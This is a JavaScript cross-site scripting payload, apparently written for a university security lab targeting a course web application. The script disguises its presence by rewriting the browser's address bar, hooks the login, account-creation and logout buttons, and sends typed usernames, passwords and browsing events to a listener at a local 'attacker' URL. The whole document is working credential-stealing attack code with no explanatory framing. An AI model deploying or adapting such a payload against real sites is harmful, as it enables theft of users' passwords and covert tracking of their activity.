
<script>
	var payload = function(){
	var attackerUrl= "http://127.0.0.1:31337/stolen";
	var baseUrl = "http://trurl.cs.illinois.edu";
	var getUsername = function(){
		var nameSpan = document.getElementById("logged-in-user");
		if(nameSpan == null){
			return null;
		}
		return nameSpan.innerHTML;
	};
	var getEncodedUrl = function(){
		return document.location.pathname;
	};
	var changeAddr = function(url){
		window.history.replaceState({}, "", url);
	};
	var logPage = function(){
		var username = getUsername();
		var p = {};
		p["event"] = "nav";
		p["url"] = getEncodedUrl();		
		if(username != null){
			p["user"] = username;
		}	
		$.get(attackerUrl, p);
	};
	var logLogin = function(){
		alert("LOGIN");
		var user = document.getElementById("username").value;
		var pass = document.getElementById("userpass").value;
		var p = {"user":user, "pass":pass, "event":"login"};
		$.get(attackerUrl, p);
	};
	var logLogout = function(){
		var user = getUsername();
		var p = {"user":user, "event":"logout"};
		$.get(attackerUrl, p);
	};
	var loadInit = function(){
		changeAddr(baseUrl);
		logPage();
		//called everytime active history changes					
	}
	var listeners = function(){
		var loginButton = document.getElementById("log-in-btn");
		var createButton = document.getElementById("new-account-btn");
		var logoutButton = document.getElementById("log-out-btn");
		if(loginButton != null){
			$("#log-in-btn").click(logLogin);
			$("#new-account-btn").click(logLogin);
		}
		if(logoutButton != null){
			$("#log-out-btn").click(function(e){
				alert("LOGOUT");				
				logLogout();
			});
		}
	}
	window.onpopstate = function(){
		alert();
		logPage();
		listeners();
	};
	$(document).ready(function(){
		alert();
		logPage();
		listeners();
	});
	loadInit();
	};
	payload();
</script>
